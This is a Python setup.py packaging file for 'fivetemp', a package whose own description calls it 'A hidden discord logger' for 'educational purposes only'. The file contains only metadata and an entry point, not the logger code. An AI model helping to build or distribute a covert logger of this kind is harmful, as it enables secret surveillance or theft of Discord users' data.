from setuptools import setup, find_packages

setup(
    name='fivetemp',
    version='1.0.3',
    description='A hidden discord logger. Open for feature requests. discord.gg/zUjRjbJS educational purposes only. Fix Release 3',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    author='Abyzms',
    author_email='abyzms0@gmail.com',
    url='https://github.com/Abyzms-Amphetamine/fivetemp',
    packages=find_packages(),
    install_requires=[
        'rgbprint',
        'requests',
    ],
    entry_points={
        'console_scripts': [
            '5t=five_temp.cli:main',
        ],
    },
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
)
